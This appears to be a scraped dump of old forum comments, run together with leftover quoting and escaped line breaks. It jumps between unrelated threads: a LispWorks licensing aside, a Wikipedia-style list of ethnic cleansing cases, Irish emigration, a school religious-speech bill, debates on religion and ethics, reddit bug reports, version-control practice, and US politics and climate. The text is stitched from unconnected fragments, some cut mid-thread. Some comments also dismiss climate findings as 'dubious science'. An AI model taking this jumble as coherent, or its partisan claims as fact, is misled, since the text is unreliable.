Win32."", ""That's basically the idea, yep. My point is, or was supposed to be, that LispWorks could make itself very much more attractive by bundling free or cheap compilers for other major platforms with paid licenses of the basic version, probably without really hurting sales.

In order to achieve their goal of creating an ethnically ""pure"" Tamil state in the North and East of Sri Lanka, the LTTE forcibly expelled the entire Muslim community - numbered at around 80,000 - from the northern Jaffna peninsular of the island. They were forced to leave within 48 hours of an LTTE warning and not permitted to take any of their belongings, which were subsequently looted by the LTTE. \n\n\n\n\n\n&gt;The widespread ethnic cleansing accompanying the Yugoslav wars from 1991 to 1999, of which the most significant examples occurred in eastern Croatia and self-proclaimed Republic of Serbian Krajina (1991-1995), in most of Bosnia (1992-1995), and in the Albanian-dominated breakaway Kosovo province (of Serbia) (1999). Large numbers of Serbs, Croats, Bosniaks and Albanians were forced to flee their homes and expelled.[74] \n\n\n\n\n\n&gt;The forced displacement and ethnic-cleansing of more than 250,000 people, mostly Georgians but some others too, from Abkhazia during the conflict and after in 1993 and 1998.[75] \n\n\n\n\n\n&gt;**The 1994 massacres of nearly one million Tutsis by Hutus, known as the Rwandan Genocide[76][better citation needed]**\n\n\n\n\n\n&gt;The mass expulsion of southern Lhotshampas (Bhutanese of Nepalese origin) by the northern Druk majority of Bhutan in 1990.[77] The number of refugees is approximately 103,000.[78] \n\n\n\n\n\n&gt;Displacement of more than 500,000 Chechen and ethnic Russian civilians living in Chechnya during the First Chechen War in 1994-1996.[79][80][81] \n\n\n\n\n\n&gt;More than 800,000 Kosovo Albanians fled their homes in Kosovo during the Kosovo War in 1999. By November 1999, most of the Albanians had returned to Kosovo.

Most have been relocated by the Sudanese government to former villages of displaced non-Arab people. Some 2.5 million have now been forced to flee their homes after attacks by Sudanese troops and Janjaweed militia.[86]**\n\n\n\n\n\n&gt;Currently in the Iraq Civil War (2003 to present), entire neighborhoods in Baghdad are being ethnically cleansed by Shia and Sunni Militias. Some areas are being evacuated by every member of a particular secular group due to lack of security, moving into new areas because of fear of reprisal killings. As of June 21, 2007, the United Nations High Commissioner for Refugees estimated that 2.2 million Iraqis had been displaced to neighboring countries, and 2 million were displaced internally, with nearly 100,000 Iraqis fleeing to Syria and Jordan each month.[87][88] \n\n\n\n\n\n&gt;Although Iraqi Christians represent less than 5% of the total Iraqi population, they make up 40% of the refugees now living in nearby countries, according to UNHCR.[89][90] In the 16th century, Christians constituted half of Iraq\'s population.[91] In 1987, the last Iraqi census counted 1.4 million Christians.[92] But as the 2003 invasion has radicalized Islamic sensibilities, Christians\' total numbers slumped to about 500,000, of whom 250,000 live in Baghdad.[93] Furthermore, the Mandaean and Yazidi communities are at the risk of elimination due to the ongoing atrocities by Islamic extremists.[94][95] A May 25, 2007 article notes that in the past 7 months only 69 people from Iraq have been granted refugee status in the United States.[96] \n\n\n\n\n\n&gt;The ethnic cleansing of African American population of some racially mixed Los Angeles neighborhoods by Mexican street gangs.

Clearly this argues that people have been leaving Ireland rather than arriving, and while Sweden may not have a hugely hybridized population in the sense of say, France, it has long been a power center among the Baltic states, ie; Finland, Norway, Denmark, Germany, Poland, Estonia, Latvia and Lithuania, and as such, unlike Iceland (by way of a for example) or Ireland, is home to a relatively hybridized population.  \n\n\n\nBy way of buttressing my position, I will note that many Irish thinkers have concluded that the great tragedy of the Irish is not the famine or the British, but is rather that most of Ireland's best and brightest have always left her, have gone across the seas in search of something better than what they knew at home.  If you have ever been to Ireland you will know what I am talking about; everywhere one goes, there are old and decaying houses crumbling into the fields and moors.  Ireland has long been an abandoned country and it is only in recent years with its new-found economic health that people have begun to immigrate *to* her rather than away.  (That they are mostly Eastern Europeans and Portuguese and Spaniards and even Brazilians has been a cause of a small amount of disgruntlement among the traditional populace, but they will get over it in time, and the island will thrive as a nation once again.)  \n\n\n\nThe point is, Ireland was the last third-world country in Western Europe.  It was an isolated economic dead-end for generations and no one wanted to live there.  This has never been the case for Sweden.     ""]"

This is the only ""two-sided coin"" covered in the First Amendment - government can\'t sponsor religion but must not prevent free expression of religious views. What does this statement mean? Where are the lines drawn? This bill merely sets the ground rules for the implementation of that statement, which in my opinion is absolutely necessary. You have to spell these things out or you end up mired in ambiguity.\n\n\n\nSo, blame the First Amendment.\n\n\n\n\n\n   ', ""   I don't see how you get these implications from reading the bill.\n\n\n\nThe bill outlines clear, neutral guidelines for choosing who gets to speak:\n\n\n\n&gt; The forum shall be limited in the following \n\n&gt; manner:  (a) Only those students in the \n\n&gt; highest two grade levels of the school and \n\n&gt; who hold one of the following positions of \n\n&gt; honor based on neutral criteria shall be \n\n&gt; eligible to use the limited public forum: \n\n&gt; student council officers, class officers of \n\n&gt; the highest grade level in the school, \n\n&gt; captain(s) of the football team, and other \n\n&gt; students holding positions of honor as the \n\n&gt; district may designate.\n\n\n\n...\n\n\n\n&gt; tell me how you feel about their ability to \n\n&gt; perform these tasks fairly and competently. \n\n\n\nJust because district officials might be incompetent, that does not mean the right to free speech should be infringed.

The school is still obliged to follow the Establishment clause of the First Amendment and not sponsor any form of religious belief. The bill specifically stresses that the school must rigidly adhere to the principle of separation of church and state. *However*, the bill addresses what *students* are allowed to say in the public forums that the schools oftentimes provide, such as graduation speeches. Why can't the Valedictorian thank God or something?

Secular speech is not a problem, because by definition it cannot favor an establishment of religion. Religious speech is a problem, however. It must be dealt with specially because of the First Amendment. The school officials are clearly not allowed to get involved in religious speech, as that would be a situation where it would be accused of favoring a particular religion. *But*, the school provides many places where students can express themselves - every piece of written work and every platform where a student can speak. The First Amendment forbids the school from prohibiting religious expression in these arenas. So the school is in a bind here - how does it reconcile these two simultaneous requirements? This bill seems to strike a reasonable balance to me.\n\n\n\n&gt; ""here you are under our guidance and speak \n\n&gt; in the areas we say"".\n\n\n\nThe school can set policies restricting speech specifically where it disrupts the learning environment.

DES MOINES SCHOOL DIST., 393 U.S. 503 (1969)](http://supreme.justia.com/us/393/503/)', ' &gt; public schools are a special place.\n\n\n\nYes, but as the court case I referenced points out, any restrictions on free speech rights are *subject to application in light of the special characteristics of the school environment.* Specifically, any restrictions require evidence *that the rule is necessary to avoid substantial interference with school discipline or the rights of others, is not permissible under the First and Fourteenth Amendments.* It is not a right for *one student* not to be free of religious speech from *another student*.\n\n\n\n&gt; The government may not set aside a space \n\n&gt; for religious anything, that violate the \n\n&gt; establishment clause.\n\n\n\nThe bill does not create any new spaces. All spaces indicated *already existed*. None of these spaces have a *specifically* religious purpose. The bill merely states that students cannot be forbidden from religious expression in these spaces. The school is not sponsoring *any* point of view of the student, so there is no violation of the Establishment clause.\n\n\n\n&gt; The law in question makes a specific \n\n&gt; religious exemption for speech.\n\n\n\nWhat do you mean by exemption here anyways? From the plain meaning of the word - immunity from some rule - what immunity do you see granted? \n\n\n\nReading the bill,\n\n\n\nSection (a) simply states that student religious speech must be treated the same as secular speech. How is this an exemption?\n\n\n\nSection (b) says that the school shall set aside a limited public forum (limited in that the speech is subject to school regulations, specifically *obscene, vulgar, offensively lewd, or indecent speech* is not allowed.) with student selection based on neutral criteria (students are not *hand picked*, but rather chosen based on specific, generally recognized achievements) and requiring the school to prominently and obviously disclaim any endorsement of the speech contents. How is this an exemption?\n\n\n\nSection (c) says that student expression cannot be prohibited *just because* it is religious. How is this an exemption?\n\n\n\nSection (d) says that religious speech should \n\nnot be granted any special reward or punishment, but should be graded on ordinary academic standards. How is this an exemption?\n\n\n\nSection (e) says that students can form religious student associations in the same manner as secular student associations. How is this an exemption?\n\n\n\nSection (f) says that the school must follow some variation of the Model Policy by the State, defined in Section (g) standardizing the limited public forums available to students. How is this an exemption?\n\n\n\nSection (g), goes into very specific detail about what constitutes public forums and who can speak. Where are the examples of any specific exemptions here, where religious speech is treated differently?\n\n\n\nSections 2 - 5 are boilerplate.\n\n\n\nIt seems to me that this bill is the opposite of an exemption for student religious speech, ensuring that student religious speech is accorded the same protections and facilities as any other kind of student speech.\n\n\n\n&gt; SCOTUS has looked very harshly on laws with \n\n&gt; a religious purpose.\n\n\n\nExamples? Because the court has ruled the other way too. For example (a case relevant to this bill) is [Widmar v. Vincent](http://religiousfreedom.lib.virginia.edu/court/widm_v_vinc.html),\n\nwhere the Supreme Court struck down a University of Missouri policy that religious groups could not use school facilities for religious purposes. There are further examples on the parent page http://religiousfreedom.lib.virginia.edu/court/.\n\n\n\nIt seems that generally, the Supreme Court only strikes down laws based upon whether the violate free speech rights or the Establishment clause. i.e., whether or not they are truly unconstitutional.\n\n\n\n&gt; The comments were not on topic and so fail.\n\n\n\nOne of your previous comments, for reference:\n\n\n\n&gt; Either they say ""here you can speak freely"" \n\n&gt; or ""here you are under our guidance and \n\n&gt; speak in the areas we say"".\n\n\n\nI was pointing out that the second clause is not covered under the scope of this bill.

If we itemize the complaints we see that the majority of them stem from actions of this administration, under the guise of Civil Religion, which was my last point.\n\n\n\nI will now address the sections you have highlighted.\n\n\n\n&gt;Well, that\'s not the true faith. Hating queers/ rejecting science/ stifling questions and dissent... that\'s not the true faith. People who do that aren\'t real (Christians/ Jews/ Muslims/ Hindus/ etc.).\n\n\n\nSorry, but any doctrinal system involve distinctions, not recognizing these distinctions is foolish. Do we lump all insects together when we study them biologically? Do we lump all spiders together? This is not a logical or legitimate complaint. We examine both difference and similarities, this is the essence of not just modern science but common sense.\n\n\n\n&gt;I don\'t think any of you have it right. To me, it all looks like something that people just made up.\n\n\n\nSo according to the author, none of the belief systems of the world have any value at all. Perhaps all societal successes within these belief systems are somehow accidental? Thousands of years of human progress and apparently none of it came from any religious insight anywhere! Not a remotely defensible view.\n\n\n\n&gt;How the hell do they know which parts of the Bible/ Torah/ Koran/ Bhagavad-Gita/ whatever God really meant, and which parts he didn\'t?\n\n\n\nSo this assumes an equivalence. There is no equivalence between these texts, they are not the same and they do not have remotely the same origins. According to the author\'s previous statements all of these religions must be equally wrong. However there is no equally itemized condemnation of Muslims, Hebrews, or Buddhists, all of which in areas of dominance have equally fervent believers. Rather her ire is directed uniquely at Christians and particularly the red fabric used by this administration, which is designed to invite exactly this kind of attack. Hence my invitation to examine the structural problems related to the vast majority of her complaints, rather than just retreating to a lazy blanket condemnations. Sure some of these religions occasionally get an check off in the also ran category as indicated in the other cited paragraph, but no serious examination has been done in this essay.\n\n\n\n&gt;And if they don\'t know, if they\'re just basing it on their own moral instincts and their own perceptions of the world, then on what basis are they thinking that God and their sacred texts have anything to do with it at all?\n\n\n\nSo I think we have to look at the societal successes that organize religions yield the world over. Not a hard case to make. If they didn\'t provide some societal benefits, there would be no religions. Thousands of years of social evolution have not washed them out. There must be some salvageable pieces. Perhaps this is why there is a study of something called ""ethics"", which attempts to create similar value systems in the absence of divinity?', 'Yeah is bugs.reddit.com the right place these days or what?', '&gt;But you haven\'t addressed her point. Her point is that moderates have no more basis -- if anything, less -- for their interpretation of their scriptures/traditions than any other movement in the same tradition.\n\n\n\nSo her point doesn\'t make any sense. Essentially she is saying no one can make any claims because no one has any basis from which to judge the underlying. Which again assumes there are no societal successes attributable to the underlying. Somehow we are in a scientific system where there are no  obtainable metrics whatsoever. \n\n\n\nObviously this is not true. Clearly there must be some successes or the religious systems cited would not have been able to continue themselves for hundreds if not thousands of years.\n\n\n\nSo the author has chosen some lazy thinking, where everything is bad, and no reasoning is possible other than the authors, because there is nothing even remotely measurable from which we can construct a view. \n\n\n\nHistorical precedent tells us otherwise. Surely even a rudimentary application of evolution in a sociological perspective relative to the societies that perpetuate religious beliefs including the Christian ones, indicate there are some positive results. Hence the study of ""ethics"", which you so cleverly avoided addressing, for what is ""ethics"", but precisely the ongoing attempt to construct a post-religious future for humanity.', "" So if I send you a link to the bugs I and others have put into bugs.reddit.com, whould you follow those links and look at the subreddit, or what that break the space time continuum or something? \n\n\n\nBeing that feedback wasn't working until a few hours ago and all...\n\n\n\nLooks like two of the first 7 bugs in bugs.reddit.com have been fixed.

', '&gt;But that doesn\'t make it ""more"" Christian or more truly Christian.\n\n\n\nSo if you believe in the concept of literary analysis, you certainly can do a textual analysis of the religious text and get a pretty good answer to this question.\n\n\n\n&gt;And propagation doesn\'t necessarily mean there\'s a benefit (though I do think there has been some). Viruses stay with us too, you know...\n\n\n\nSo this is an interesting argument, but usually those viruses that stay with us engage in some type of symbiosis. Which is certainly what I am arguing here.\n\n\n\nSo if we look at the study of ethics for example the compact survey text [*Moral Philosophy through the Ages* by James Fieser](http://www.amazon.com/Moral-Philosophy-Through-James-Fieser/dp/0767412982/) we can clearly see that the search for a non-divine inspired codex that resembles the best features of the Bible has been going on for centuries. And really it\'s not very surprising that many of the great Moral Philosophers would look for examples, from those things in society that have demonstratively been working, from which to build on. And many give much more reasoned arguments than those presented by the author, and higlighted above.\n\n\n\nHow shall we determine the true Christianity from the false? Is it the authority of the Church? (Then which church?) Or the Bible? (Then which canon, which version, and which parts?) The inward light of the Quakers, the reason of the Socinians, etc.? (Then according to whom?)\n\n\n\nAnd so we see your assumption of the impossibility of this task assumes there is no possible metric, because apparently we have reached some kind of Godel like paradox. We can apparently define what the religion is to inveigle against it, but somehow we can\'t use or conceive of any metrics to analyze it\'s structure. Sorry no. \n\n\n\nFrom a sociological point of view we can most certainly do textual analysis, sociological studies of group behavior, as well as applying the vast array of tools available to the modern thinker to open the box and figure out pretty nearly what is the intention behind the religion as well as figuring out to what degree which sub-groups of the total population that declare their observation of it, practice it.  \n\n\n\nWhich is exactly why claiming a study of what is Christianity or any other religion for that matter is both possible and necessary for dealing with the consequence of the practices of those religions. Hence the lack of validity of her position that such things aren\'t possible, and her strange stance that she is angry at people who try.\n\n\n\nIs it not possible to analyze and study culture and religion in general? Sociology has been trying to do this since it\'s founding in the late 19th century, mainly in the context of native peoples all over the world.\n\n\n\nI think the sections you have highlighted are actually a poorly thought out distraction from the rest of the passage, which highlights many of the concerns I tried to address in my initial response.', 'unless it takes you to the subreddit or tag group aggregation that it represents.', 'Never fear! A solution has been provided for you.\n\n\n\nYou can go to prefs and the subreddit tabs and filter by subreddit if you like.\n\n\n\nhttp://reddit.com/prefs/subreddits\n\n\n\n', 'So you\'re not addressing anything I said. Rather you are just being churlish.\n\n\n\nSo let\'s just take one of your counters.\n\n\n\n&gt;Not sure what planet you\'re living on, but you\'d be hard pressed to find more than a small minority of moral philosophers today who expect us to find anything like a ""codex resembling the Bible.""\n\n\n\nWhich modern ethicists do you follow? Can you even name one?\n\n\n\nThe reason I cited the ethics survey book, is because it precisely shows how modern Western ethics evolved directly from the biblical moral model. Would you discard Kant? Aquinas? Would you discard the foundations of Western ethical thought?\n\n\n\nApparently you don\'t believe in symbiosis either? I\'m not sure how you digest your food, maybe the bacteria in your stomach doesn\'t exist. \n\n\n\nIs it possible that religion exists symbiotically within the culture that observes it. I would think that would be an obvious yes. You are just being silly in not addressing this.\n\n\n\n&gt;Including the be-good-because-Jesus-says-so kind of religion, can only be deconstructed away into humanism.\n\n\n\n[Humanism](http://en.wikipedia.org/wiki/Humanism) which would be what? Oh yeah that would be a moral philosophy, which would, wait for it, **fall under the branch of academic study known as ethics**! Amazing how that circle closes. In fact your whole atheistic system of belief, which unless you invented all by yourself, spontaneously,  stems from this heritage.\n\n\n\nSo can we sociologically study the phenomena of Christian religion, much the same way that the animist beliefs of a native people could be studied and analyzed. I think we can.\n\n\n\nCan we apply modern thought to the texts of the Christian religion, and the various sub-groups of people who claim to be observing a Christian belief, and compare the two across each of these populations. I think this is also a no brainier. \n\n\n\nAnd the beauty is we can apply all the tools of modern sociology to this process.\n\n\n\nYour argument, and the section of the author\'s argument that you have highlighted boils down to, a belief in clearly being able to describe the sociological phenomena of the Christian religion, but yet not be able to get any handle on measuring it, categorizing it, or comparing it to variation of itself or other religions. How can this be? How can some human activity exist that can be described and yet not measured? Did you see how absurd such a notion is?', ""So your argument boils down to a relativistic one. Can we ever know what truth is?\n\n\n\nThe answer of course is no, But we can accumulate a lot of experimental data and observation that can lead us to an understanding, which other people may be able to also accept. I think whether you are religious or not most Weterners would accept the premise of the modern scientific method.\n\n\n\nBy expanding your argument we can say that reality is whatever a person thinks it is, and therefore this conception of it creates an environment in which extremism can flourish by justifying whatever we want.\n\n\n\nWithout a concept of mutually agreeable truth, we do invite a chaos, or an Orwellian dictatorial order in which the truth changes minute to minute and its meaning is decided on by the rulers of a society entirely externally to its membership. However this has nothing to do with Christianity.\n\n\n\nAll knowledge systems at some level require faith, We know this, in a demonstrable way,  as a result of Cantor and  Godel and others that have attempted to create a foundation for mathematics. At some level we must have postulates or axioms from which all other knowledge can be built, even if its just the existence of two different states, true and false, as in the Godel attempt. \n\n\n\nTherefore we can see that your claim that faith alone is the culprit for the evils of the world is an inconsistent statement. I won't at this time speculate on your attempt to apply this inconsistency to religious belief systems."", 'Was already submitted to bugs.reddit.com and then sent via feedback.\n\n\n\nhttp://bugs.reddit.com/info/5yff0/comments/\n\n\n\nI misspelled the title.lol.']"

A couple of C modules and sound algorithms are good enough, at least for version control systems which are mostly I/O bound.', '&gt; Source control needs to be seemless if you expect people to use it correctly.\n\n\n\nYes and no. Source control must be seamless if you want to force them down the throat of everybody. In which case this is nothing more than a sophisticated backup systems.\n\n\n\nIMHO, version control *is part of the programming activity*. You have to think to tailor revisions suitable for reviews and history mining: short, standalone and logically consistent. Otherwise, versioning is pointless. Once you do that, the actual version control system operation cost is almost negligible.\n\n\n\nThe 20/80% percent split is not really about cutting edge/mainstream programmers but rather about those for who VCS are a programming tool like a good IDE or compiler and those for who they are just an imposed burden.\n\n', '&gt; What I\'d like you to do is explain to me what my office of 5 people, all of whom work in the office, in 2 rooms right next to each other, would gain by switching to a DVCS (assuming tool support wasn\'t even a problem).\n\n\n\nThey are not exclusive. Most people using DVCS these days work on top of another centralized system. By allowing, local/private and usually cheap branching or revision history manipulation (like Mercurial MQ extension), it buys you a step between a single in-progress working directory and a irremediably published changeset. What you quickly learn from code reviews is a feature equals many revisions. With most VCS forcing you to commit *and publish* your working directory at the same time, like SVN does, you have a choice:\n\n- The classic monster commit. The feature is implemented in one single revision. Refactoring are merged with file renames, with code moves and code style fixes. This is useless and your VCS is a mere backup system. But this is the usual practice.\n\n- Think very hard about the feature, split it mentally then execute your carefully thought plan. The resulting revision set is usable for review/history mining/debugging. But this is made awfully hard by the fact you have to commit every step right after implementing it. There is no room for mistake. Sure you can fix errors by adding additional revisions but they are just noise in the code history and reduce its usability.\n\n\n\nDVCS makes the latter easier by allowing you to craft the revision set without publishing it at once. Suppose that while refactoring you unearth a bug, just keep the refactoring for later, revert all changes and fix the bug first. And even add a test *in a separate revision* to ease cherry-picking with another stable branch.\n\n\n\nWhy is history tailoring important ? Because the *risk* brought by a feature is often related to the size of the largest patch on the path from the current codebase to the implemented feature. A good way to make people aware of this is to make them do code reviews.\n\n\n\nThis is for daily use.\n\n\n\nNow, DVCS bring other features because their nature made them a requirement and also because someone eventually figured they may be first-class development tools rather than subparts of a release system (the following will emphasize mercurial which I know well, but other systems have similar features):\n\n- I find revision browsing tools much better in DVCS. We use svn as our main VCS but I always export project in Mercurial for reviews, I cannot stand TortoiseSVN to do that. In a way, it helps disclosing obfuscated revisions histories, like sourceforce CVS-base projects. And code history tells a lot more than a single revision snapshot.\n\n- Revision history mining tools are more powerful. Check mercurial ""log"" or ""grep"" commands for revision filtering and output templating. Having a CLI here makes sense because you can tailor the command output and extends your tools via scripting.\n\n- Bisecting tools: perform a binary search on a revision range to pinpoint the source of a bug. You can do that with any tool supporting project wide revisions, I just never saw an appealing way to do that with SVN.\n\n- Cherry picking of revisions\n\n- Cherry picking of commit hunks (could be done better with a properly configured vim but it\'s good to have off the shelf support for this)\n\n- Working offline\n\n\n\nDVCS are far from perfect and may not fit all corporate environments or policies. But they do not have to, and still can make you change your way of programming, or at least think again on what VCS are really about. Which is good enough for me.']"

(They\'re not.) Just curious why someone who ""leans left socially"" and is concerned with smaller government would support either party.\n\n\n\n\n\nGood question, I\'m glad you asked.  Frankly, it comes down to a couple of issues that the Republican party still seems to agree with me on - particularly gun ownership.  I feel like the Democratic party ignores all the evidence that responsible people owning guns deters crime, or at the very least does nothing to increase - yet they still continually try to take my guns from me.\n\n\n\n\n\nI also feel like the Democratic party is big on declaring large groups of people ""victims"" and then taking my money from me for ""the better good"" and giving it to those people.  I prefer deciding who - if anyone - to give my money to as charity.\n\n\n\n\n\nBut the Republican party has clearly abandoned me as far as personal rights go and Bush has clearly trashed the Constitution.\n\n\n\n\n\nWhat REALLY SCARES ME is that none of the Democratic candidates seems to be overly concerned with correcting ANY of these wrongs.  Not even Iraq, really.\n\n\n\n\n\n&gt;In fact, what I really find odd is that this cycle, it seems the country is more ripe than ever for a very determined, very serious 3rd party upset, and yet none loom on the horizon.\n\n\n\n\n\nNot just ""odd.""

If we REALLY want to do something about it, let's start with some things that will do EVERYONE some good.  Some win/win situations. \n\n\n\n\n\nLike for instance, my home was built by a large builder.  The air conditioner is the bare minimum to keep up with my house size and some Summers it almost doesn't.  An EFFICIENT and larger A/C would use FAR LESS energy. Even though the initial cost would have been higher for the house, I'd have saved it back quickly with my electric bills.\n\n\n\n\n\nChanging it NOW would be expensive.  I've already paid for the existing units and installing in an existing house is way more work/labor than installing in a house that is being built at the proper point in the schedule.  It would take me far longer to recoup my expense.\n\n\n\n\n\nBut if there were reasonable legislation mandating a certain level of efficiency and size for new homes, that could be a relatively non-intrusive and successful way to cut back significantly on energy usage, without really digging into anyone's rights.\n\n\n\n\n\nLight bulbs (that are currently not as good as incandescents in many ways) are small change compared to air conditioners."", ""&gt;So is dick cheney's what's your point?\n\n\n\n\n\nDick Cheney isn't going around saying that the Earth is doomed becaus people are using too much energy and producing too much carbon dioxide and he isn't trying to get congress to legislate my energy usage.\n\n\n\n\n\nAl Gore is saying that he thinks the world is in peril because of this, yet he isn't making any of the sacrifices he is asking the rest of us to make.  That either indicates extreme arrogance, or that he doesn't REALLY believe it is true.  If he really beleived it, he would work to reduce his carbon footprint below the average American.  He doesn't even try.\n\n\n\n\n\n&gt;Oh I get it you think we should shit on al gore because he has a big house and cares about the environment and praise cheney because he as a big house and want to destroy the environment.\n\n\n\n\n\nNo, I think that Gore is asking us to all make sacrifices, but he doesn't appear to believe that he should give up anything to save the Earth.  If that is so, and arrogance is all it takes to absolve you of your responsibility, then I am arrogant and I'd like to opt out as well.\n\n\n\n\n\nMore simply put though, I AM ALREADY MAKING LESS OF A CARBON FOOTPRINT THAN AL GORE so I am doing more about the environment than he is right now."", '&gt;The Republicans certainly have lost their fiscal conservative view points recently.\n\n\n\n\n\nI agree, this is one of the areas where the Republican party has abandoned me.', ""&gt;They hate the most successful Democrats.

By ""large"" I mean that the scope of the data is well beyond the scope of mankind and that usually means a lot of wild ass guesses.\n\n\n\n\n\nI used string theory and dark matter as examples because they are also part of a ""large"" science where people are guessing.  Educated guesses to be sure, by smarter people than I - to be sure.  But still guesses that can be, and because of the poor data available often are, wrong.\n\n\n\n\n\nAnother analogy I consider useful is dinosaurs.  Dinosaurs were considered to be [REPTILES](http://encarta.msn.com/encyclopedia_761573347/Dinosaur.html) when I was in school.  But now scientists believe they are actually [AVIAN](http://www.ucmp.berkeley.edu/diapsids/avians.html). \n\n\n\n\n\nHeck, [we don\'t even have a good grasp of how MAN came to exist yet](http://www.smh.com.au/news/science/fossil-find-changes-apeman-story/2007/08/22/1187462353535.html), but Hansen and his gang are SURE of global temperatures millions of years ago. \n\n\n\n\n\nThat alone should kick in a little skepticism.

But to suggest that Bush and his administration LIED about WMD\'s is deceptive and dishonest.  [The Democrats thought the same thing.](http://www.youtube.com/watch?v=FNgaVtVaiJE&amp;mode=related&amp;search)  It was basically a failure of our intelligence agencies.\n\n\n\n\n\nBut I have no problem with Iraq being a mistake.  I just think that it was a mistake, not a conspiracy.\n\n\n\n\n\n&gt;In my experience, there are reasons that conservatives give for hating democrats that are not about democrat\'s political positions and their success, but most of the reasons are not actually true things. \n\n\n\n\n\nYou should expand your horizons then and also learn a valuable lesson.  Just because YOU haven\'t experienced something, doesn\'t mean that is the sum of all knowledge on that situation.  People tend to do this.  They tend to associate with like-minded people and then assume that most people think like them and other people who don\'t think like them all do it for the same reasons.  It is usually easier to marginalize others who don\'t think like you by assuming the worst possible reason for them to think the way they do, rather than consider they may have valid points and a different perspective.\n\n\n\n\n\nPerspective is everything.\n\n\n\n\n\n&gt;I have a predictive model: the hatred by the right of people is an increasing function of: (member of democratic party)*(degree of success) and -(frequency of criticizing \'democrats\'). No other variables are significant.\n\n\n\n\n\nWell, if no other variables are significant, then nothing I do or say can convince you otherwise.  Heck, you might as well just be a RELIGION.  I mean, that is what makes Bush so crazy, right?  He KNOWS he is right and that is what is so wrong, unless you happen to be doing the same thing - but from the other side apparently.', 'Regarding my statement that Global Warming is a BELIEF and not a proven fact you wrote:\n\n\n\n\n\n&gt;I reread your comments and this really made me take a double look. We have kept accurate records (climate) for the past 100 years or so, for the most part. Certainly we have had accurate records over the past 50. The ice is melting. This is not a debatable point. The global temperatures are slightly higher. This is not a debatable point. Ice is going away and temperatures are higher than what we had been recording in the past (although, it is a very limited amount of time for the data that we have).\n\n\n\n\n\nI agree with you so far.  Although [the recent error in global temperatures that was revealed recently](http://www.technologyreview.com/Energy/13830/) actually shows 1934 as the hottest year in the batch, but I\'ll agree that it has been ever-so-slightly hotter globally in recent years.\n\n\n\n\n\n&gt;It may be pure coincidence that we happened to be spitting chemicals into the air and this is occurring in our climate. I am willing to accept that, because we haven\'t been fully industrialized for very long (100-500) years is a blink for this planet), so these things may have occurred at the same time with no relationship. Seems kinda strange they are occurring at the same time, but that is not proof.\n\n\n\n\n\nExactly. We are still on the same page pretty much.\n\n\n\n\n\n&gt;But I\'m not really arguing that it is man made or that we can have an impact one way or the other. \n\n\n\n\n\nOk, we are still very much in agreement.\n\n\n\n\n\n&gt;There used to be days in LA county where they told you not to go outside (this may still occur) because the smog was so bad and it was unhealthy. \n\n\n\n\n\n[LA County is an unusual geographic phenomenon that makes the smog much worse than it would be otherwise.](http://query.nytimes.com/gst/fullpage.html?res=9406E3DC1131F931A35750C0A9649C8B63&amp;sec=&amp;spon=&amp;pagewanted=print)  But to be sure, you pack THAT MANY people in a single place and you are going to be far more likely to overload the system.  LA is one of the most densely populated cities on Earth.  Without a doubt it will be worse than most places.\n\n\n\n\n\n&gt;Have you seen pictures of the cloud above China!? Again, I don\'t know if this is effecting out climate, but it certainly isn\'t healthy.\n\n\n\n\n\nNo, what is the story on the cloud above China? But you bring up an interesting point that is one of my beefs with Kyoto and other plans:  Many developing countries get a pass, even though they are probably committing the worst offenses when it comes to carbon emissions.\n\n\n\n\n\n&gt;I wish the global warming stuff would just go away (the hype) and everyone could catch their breath and just agree that we have to modify our actions with respect to what we throw into our environment.\n\n\n\n\n\nI also like the idea of being more ""green.""  I don\'t like it being legislated based on bad science.\n\n\n\n\n\nFor instance, I have put a bunch of those compact flourescent bulbs in my house.  Lowe\'s and Home Depot are pushing them like crack.  They cost more, but it is within my affordability and tolerance ranges.  So I buy them.  And it looks like they are selling them pretty well.\n\n\n\n\n\nPeople will make the changes naturally when given the option at a reasonably affordable price.  We don\'t need the government to force one-size-fits-all solutions on businesses based on dubious science.\n\n\n\n\n\nI\'m ok with tax credits and incentives for companies to be greener.  I just don\'t like forced legislation.  People will do it on their own anyway, eventually.', '&gt;I stand by what I said: the planet is warming (for whatever reason) and we have a basic human responsibility to ensure we cause as little damage to our environment as possible, regardless of if we are causing global warming or not.\n\n\n\n\n\nThen perhaps we aren\'t as far apart as it seems.  We just differ on what is ""as little damage as possible.""  I\'m COMPLETELY WITH you on the IDEA of trying to do less damage to the environment.  I just want to do it based on good science and I want to do it based on ability and affordability.  I don\'t want the feds mandating draconian rules on business that aren\'t reasonable or affordable.\n\n\n\n\n\nOn the other hand, I don\'t want businesses trashing the environment to save a penny or two to give to their CEO\'s.\n\n\n\n\n\nThere has to be a reasonable middle ground.\n\n\n\n\n\nThanks for the discussion!', '&gt;Why don\'t you come out and say that Al Gore hasn\'t made any sacrifices at all so we can all point at you and laugh.\n\n\n\n\n\nWhy don\'t you put words in my mouth that I didn\'t say, then point at me and laugh at what I didn\'t say.

How come you don\'t shit on other rich people who have made no sacrifices?\n\n\n\n\n\nNo, I didn\'t say that.  Once again, you said it and then go on to pretend that since you are saying that I said it, then I must have said it.  But I didn\'t say it.\n\n\n\n\n\nLet\'s try a different tack.  Since YOU seem to think he has made sacrifices, please tell us what sacrifices you think Gore has made?\n\n\n\n\n\n&gt;You already admitted that he has made sacrifices and is conserving.\n\n\n\n\n\n(If you watch The Office, please imagine me looking like the character ""Jim"" with that amused smirk he has when dealing with one of his irrational co-workers.)\n\n\n\n\n\nUh, no.  I did not ""admit that he has made sacrifices or is conserving.""  Perhaps you could show where I made that statement?  Or maybe it would be easier if you showed where you said it and then attributed it to me.  Because I think that\'s what happened.\n\n\n\n\n\nNow, again, since you seem convinced that Mr. ""I\'m using more energy in a year than 20 average American families (and that\'s not counting my limos and air travel)"" Gore is making these sacrifices, please point them out for those of us who can\'t get past the point that he is USING LOTS MORE RESOURCES and MAKING A MUCH LARGER CARBON FOOTPRINT than the rest of us.', 'Thank goodness I only download INDECENT stuff, and not OBSCENE stuff.', 'I have a wireless (that\'s what they call cell now, you know) phone and a ""land line"" phone through my cable company.

